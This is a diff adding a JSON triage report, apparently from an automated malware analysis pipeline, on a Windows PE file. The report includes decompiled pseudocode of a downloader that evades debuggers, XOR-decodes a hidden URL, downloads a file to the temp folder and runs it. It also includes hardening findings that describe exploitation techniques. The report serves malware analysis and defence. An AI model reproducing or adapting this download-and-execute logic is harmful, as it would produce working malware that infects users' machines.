+        "id": "runtime::msvc_r6002",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_rl",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_name_unknown",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_runtime_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      }
+    ],
+    "anomalies": [
+      {
+        "name": "DownloaderApiUsage",
+        "desc": "Downloader-related apis are used",
+        "category": "imports",
+        "level": 2,
+        "num_hits": 1
+      },
+      {
+        "name": "GuiSubsystemNoWindowApi",
+        "desc": "A GUI windows application does not import any user32 window-related function",
+        "category": "headers",
+        "level": 2,
+        "num_hits": 1
+      },
+      {
+        "name": "NoChecksum",
+        "desc": "PE Header checksum is not set",
+        "category": "integrity",
+        "level": 1,
+        "num_hits": 1
+      },
+      {
+        "name": "SpaghettiFunction",
+        "desc": "Function with lots of intra jumps, could be obfuscated",
+        "category": "code",
+        "level": 1,
+        "num_hits": 6
+      },
+      {
+        "name": "XorInLoop",
+        "desc": "XOR instruction in a loop",
+        "category": "code",
+        "level": 3,
+        "num_hits": 6
+      }
+    ],
+    "carved_files": [],
+    "virtual_files": [],
+    "structures": [
+      {
+        "name": "MZ",
+        "ea": 0
+      },
+      {
+        "name": "RichHeader",
+        "ea": 128
+      },
+      {
+        "name": "PE",
+        "ea": 224
+      },
+      {
+        "name": "OptionalHeader",
+        "ea": 248
+      },
+      {
+        "name": "Sections",
+        "ea": 488
+      },
+      {
+        "name": "kernel32.FT",
+        "ea": 25600
+      },
+      {
+        "name": "urlmon.FT",
+        "ea": 26080
+      },
+      {
+        "name": "ImportTable",
+        "ea": 33676
+      },
+      {
+        "name": "kernel32.OFT",
+        "ea": 33736
+      },
+      {
+        "name": "urlmon.OFT",
+        "ea": 34216
+      },
+      {
+        "name": "ImportNames",
+        "ea": 34232
+      },
+      {
+        "name": "ExceptionTable",
+        "ea": 50176
+      },
+      {
+        "name": "Relocations",
+        "ea": 54272
+      }
+    ],
+    "decompilations": {
+      "13376": {
+        "name": "sub_140004040",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_140004040(void)\n\n{\n    return;\n}\n"
+      },
+      "1024": {
+        "name": "sub_140001000",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_140001000(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    char *pcVar6;\n    undefined auStack_718 [32];\n    uint64_t uStack_6f8;\n    undefined4 uStack_6f0;\n    undefined8 uStack_6e8;\n    undefined8 uStack_6e0;\n    undefined4 *puStack_6d8;\n    undefined8 *puStack_6d0;\n    undefined8 uStack_6c8;\n    undefined8 uStack_6c0;\n    undefined8 uStack_6b8;\n    undefined4 auStack_6a8 [2];\n    undefined auStack_6a0 [104];\n    undefined uStack_638;\n    undefined auStack_637 [271];\n    undefined uStack_528;\n    undefined auStack_527 [271];\n    undefined uStack_418;\n    undefined auStack_417 [1023];\n    uint64_t uStack_18;\n    \n    uStack_18 = [0x0x14000a008] ^ auStack_718;\n    iVar2 = (*kernel32.IsDebuggerPresent)();\n    if (iVar2 == 0) {\n        uStack_528 = 0;\n        memset(auStack_527, 0, 0x103);\n        uStack_638 = 0;\n        memset(auStack_637, 0, 0x103);\n        uStack_418 = 0;\n        memset(auStack_417, 0, 0x3ff);\n        iVar5 = 0;\n        iVar4 = iVar5;\n        do {\n            *(iVar4 + 0x14000aec0) = *(iVar4 + 0x14000aec0) ^ 0x83;\n            *(iVar4 + 0x14000aec1) = *(iVar4 + 0x14000aec1) ^ 0x83;\n            iVar4 = iVar4 + 2;\n        } while (iVar4 < 0x80);\n        do {\n            *(iVar5 + 0x14000af40) = *(iVar5 + 0x14000af40) ^ 0x83;\n            *(iVar5 + 0x14000af41) = *(iVar5 + 0x14000af41) ^ 0x83;\n            iVar5 = iVar5 + 2;\n        } while (iVar5 < 0x80);\n        uVar3 = (*kernel32.GetTempPathA)(0x104, &uStack_528);\n        if (((uVar3 != 0) && (uVar3 < 0x104)) &&\n           (iVar2 = (*kernel32.GetTempFileNameA)(&uStack_528, 0x140008aa0, 0, &uStack_638), iVar2 != 0)) {\n            strncpy(&uStack_418, 0x14000aec0, 0x3ff);\n            iVar4 = -1;\n            pcVar6 = 0x14000af40;\n            do {\n                if (iVar4 == 0) break;\n                iVar4 = iVar4 + -1;\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            if (iVar4 != -2) {\n                strncat(&uStack_418, 0x140008aa4, 0x3ff);\n                strncat(&uStack_418, 0x14000af40, 0x3ff);\n            }\n            uStack_6f8 = 0;\n            iVar2 = (*urlmon.URLDownloadToFileA)(0, &uStack_418, &uStack_638, 0);\n            if (iVar2 == 0) {\n                memset(auStack_6a0, 0, 0x60);\n                uStack_6c0 = 0;\n                uStack_6b8 = 0;\n                puStack_6d0 = &uStack_6c8;\n                puStack_6d8 = auStack_6a8;\n                uStack_6e0 = 0;\n                uStack_6e8 = 0;\n                uStack_6f0 = 0;\n                uStack_6c8 = 0;\n                auStack_6a8[0] = 0x68;\n                uStack_6f8 = uStack_6f8 & 0xffffffff00000000;\n                (*kernel32.CreateProcessA)(&uStack_638, 0, 0, 0);\n            }\n        }\n    }\n    __security_check_cookie(uStack_18 ^ auStack_718);\n    return;\n}\n"
+      },
+      "12248": {
+        "name": "sub_140003bd8",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_140003bd8(undefined8 param_1,undefined8 param_2,uint32_t param_3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    undefined8 uVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int64_t iVar8;\n    undefined auStack_88 [32];\n    undefined *puStack_68;\n    undefined auStack_58 [8];\n    undefined auStack_50 [8];\n    uint8_t uStack_48;\n    uint64_t uStack_40;\n    \n    uStack_40 = [0x0x14000a008] ^ auStack_88;\n    iVar2 = sub_140002c08();\n    iVar8 = 0;\n    if ([0x0x14000bf78] == 0) {\n        iVar3 = (*kernel32.LoadLibraryW)(\"USER32.DLL\");\n        if ((iVar3 == 0) || (iVar4 = (*kernel32.GetProcAddress)(iVar3, \"MessageBoxW\"), iVar4 == 0))\n        goto code_r0x000140003dc4;\n        000000014000bf78 = (*kernel32.EncodePointer)(iVar4);\n        uVar5 = (*kernel32.GetProcAddress)(iVar3, \"GetActiveWindow\");\n        000000014000bf80 = (*kernel32.EncodePointer)(uVar5);\n        uVar5 = (*kernel32.GetProcAddress)(iVar3, \"GetLastActivePopup\");\n        000000014000bf88 = (*kernel32.EncodePointer)(uVar5);\n        uVar5 = (*kernel32.GetProcAddress)(iVar3, \"GetUserObjectInformationW\");\n        000000014000bf98 = (*kernel32.EncodePointer)(uVar5);\n        if (000000014000bf98 != 0) {\n            uVar5 = (*kernel32.GetProcAddress)(iVar3, \"GetProcessWindowStation\");\n            000000014000bf90 = (*kernel32.EncodePointer)(uVar5);\n        }\n    }\n    if (([0x0x14000bf90] == iVar2) || ([0x0x14000bf98] == iVar2)) {\ncode_r0x000140003d60:\n        if ((([0x0x14000bf80] != iVar2) &&\n            (((pcVar6 = (*kernel32.DecodePointer)(), pcVar6 != 0x0 && (iVar8 = (*pcVar6)(), iVar8 != 0)) &&\n             ([0x0x14000bf88] != iVar2)))) && (pcVar6 = (*kernel32.DecodePointer)(), pcVar6 != 0x0)) {\n            iVar8 = (*pcVar6)(iVar8);\n        }\n    }\n    else {\n        pcVar6 = (*kernel32.DecodePointer)([0x0x14000bf90]);\n        pcVar7 = (*kernel32.DecodePointer)([0x0x14000bf98]);\n        if ((pcVar6 == 0x0) || (pcVar7 == 0x0)) goto code_r0x000140003d60;\n        iVar3 = (*pcVar6)();\n        if (iVar3 != 0) {\n            puStack_68 = auStack_58;\n            iVar1 = (*pcVar7)(iVar3, 1, auStack_50);\n            if ((iVar1 != 0) && ((uStack_48 & 1) != 0)) goto code_r0x000140003d60;\n        }\n        param_3 = param_3 | 0x200000;\n    }\n    pcVar6 = (*kernel32.DecodePointer)([0x0x14000bf78]);\n    if (pcVar6 != 0x0) {\n        (*pcVar6)(iVar8, param_1, param_2, param_3);\n    }\ncode_r0x000140003dc4:\n    __security_check_cookie(uStack_40 ^ auStack_88);\n    return;\n}\n"
+      }
+    },
+    "script_decompile": null,
+    "unpack_result": null,
+    "errors": [],
+    "duration_s": 3.98
+  },
+  "packer": {
+    "engine": "packer_intake",
+    "ok": true,
+    "label": "suspicious",
+    "score": 5,
+    "sections": [
+      {
+        "name": ".text",
+        "entropy": 6.231,
+        "raw_size": 21504,
+        "virtual_size": 21224,
+        "exec": true,
+        "writable": false
+      },
+      {
+        "name": ".rdata",
+        "entropy": 4.569,
+        "raw_size": 10240,
+        "virtual_size": 9768,
+        "exec": false,
+        "writable": false
+      },
+      {
+        "name": ".data",
+        "entropy": 2.243,
+        "raw_size": 4096,
+        "virtual_size": 8736,
+        "exec": false,
+        "writable": true
+      },
+      {
+        "name": ".pdata",
+        "entropy": 4.332,
+        "raw_size": 1536,
+        "virtual_size": 1308,
+        "exec": false,
+        "writable": false
+      },
+      {
+        "name": ".reloc",
+        "entropy": 4.282,
+        "raw_size": 512,
+        "virtual_size": 446,
+        "exec": false,
+        "writable": false
+      }
+    ],
+    "checks": {
+      "last_section_exec": false,
+      "last_section_writable": false,
+      "first_section_writable": false,
+      "ep_in_last_section": false,
+      "ep_not_in_first_section": false,
+      "raw_vs_virtual_mismatch": true,
+      "memory_only_section": false,
+      "high_entropy_exec_section": true,
+      "few_imports": true,
+      "section_count_outlier": false
+    },
+    "embedded_payload_hint": false,
+    "entry_point": 5368715072,
+    "ep_section": ".text",
+    "import_count": 2,
+    "imports_sample": [
+      "CreateProcessA",
+      "GetTempFileNameA",
+      "IsDebuggerPresent",
+      "GetTempPathA",
+      "HeapAlloc",
+      "GetStringTypeW",
+      "GetCommandLineA",
+      "GetStartupInfoW",
+      "TerminateProcess",
+      "GetCurrentProcess",
+      "UnhandledExceptionFilter",
+      "SetUnhandledExceptionFilter",
+      "RtlVirtualUnwind",
+      "RtlLookupFunctionEntry",
+      "RtlCaptureContext",
+      "GetProcAddress",
+      "GetModuleHandleW",
+      "ExitProcess",
+      "DecodePointer",
+      "WriteFile",
+      "GetStdHandle",
+      "GetModuleFileNameW",
+      "RtlUnwindEx",
+      "GetModuleFileNameA",
+      "FreeEnvironmentStringsW",
+      "WideCharToMultiByte",
+      "GetEnvironmentStringsW",
+      "SetHandleCount",
+      "InitializeCriticalSectionAndSpinCount",
+      "GetFileType",
+      "DeleteCriticalSection",
+      "EncodePointer",
+      "FlsGetValue",
+      "FlsSetValue",
+      "FlsFree",
+      "SetLastError",
+      "GetCurrentThreadId",
+      "GetLastError",
+      "FlsAlloc",
+      "HeapSetInformation"
+    ],
+    "elapsed_s": 0.204,
+    "note": "Deterministic entropy + packer checklist; heuristic label, unpacking loop still required for non-UPX packers.",
+    "duration_s": 0.2
+  },
+  "revai_tools_sec": {
+    "format": "pe",
+    "findings": [
+      {
+        "name": "Address Space Layout Randomization",
+        "present": true,
+        "claimed": true,
+        "note": "claim only: DYNAMIC_BASE set but no .reloc section \u2014 loads at preferred base",
+        "consequence": "Without ASLR the image loads at a fixed base \u2014 a predictable address for ret2libc-style exploitation and ROP gadget pivots."
+      },
+      {
+        "name": "64-bit high-entropy ASLR",
+        "present": false,
+        "claimed": false,
+        "note": "64-bit high-entropy ASLR flag not set",
+        "consequence": "Without 64-bit entropy the entropy of the address space is reduced relative to the full 64-bit layout."
+      },
+      {
+        "name": "Data Execution Prevention",
+        "present": true,
+        "claimed": true,
+        "note": "Data Execution Prevention flag set",
+        "consequence": "Without NX-compat, writable memory can be executable \u2014 classic shellcode-on-stack/heap works directly."
+      },
+      {
+        "name": "Control Flow Guard",
+        "present": false,
+        "claimed": false,
+        "note": "no GUARD_CF flag",
+        "consequence": "Without CFG, indirect calls are unvalidated \u2014 vtable and function-pointer overwrites become direct code-flow hijack."
+      },
+      {
+        "name": "Structured Exception Handling",
+        "present": true,
+        "claimed": false,
+        "note": "no NO_SEH flag \u2014 SEH handlers may exist",
+        "consequence": "The NO_SEH flag claims no SEH handlers exist; if a handler is still present the claim is false \u2014 an exception can overwrite the handler chain for control-flow hijack."
+      },
+      {
+        "name": "Signed-image enforcement",
+        "present": false,
+        "claimed": false,
+        "note": "Signed-image enforcement flag not set",
+        "consequence": "Without forced integrity, a tampered image is not rejected by the loader's integrity checks."
+      },
+      {
+        "name": "Stack cookie (/GS)",
+        "present": false,
+        "claimed": false,
+        "note": "no __security_cookie reference found",
+        "consequence": "Without a stack cookie, linear buffer overflows can overwrite the return address directly on the stack."
+      }
+    ],
+    "engine": "revai_tools_sec",
+    "source": "revai_tools",
+    "duration_s": 0.06
+  },
+  "revai_tools_sinks": {
+    "format": "pe",
+    "entry_point": "0x1000",
+    "sink_count": 3,
+    "sinks": [
+      {
+        "api": "createprocessa",
+        "dll": "KERNEL32.dll",
+        "class": "command_execution",
+        "address": "0x1400011fe",
+        "function": ""
+      },
+      {
+        "api": "heapalloc",
+        "dll": "KERNEL32.dll",
+        "class": "integer_overflow_size",
+        "address": "0x140005a0d",
+        "function": "fcn.1400059b8"
+      },
+      {
+        "api": "heapalloc",
+        "dll": "KERNEL32.dll",
+        "class": "integer_overflow_size",
+        "address": "0x140005ac7",
+        "function": "fcn.140005a70"
+      }
+    ],
+    "engine": "revai_tools_sinks",
+    "source": "revai_tools",
+    "duration_s": 1.74
+  },
+  "_format": "pe",
+  "_timings": {
+    "capa": 1.96,
+    "pe_imports": 0.02,
+    "yara": 3.76,
+    "floss": 8.21,
+    "malcat": 3.98,
+    "packer": 0.2,
+    "revai_tools_sec": 0.06,
+    "revai_tools_sinks": 1.74
+  },
+  "_stage": "quick_scan"
+}
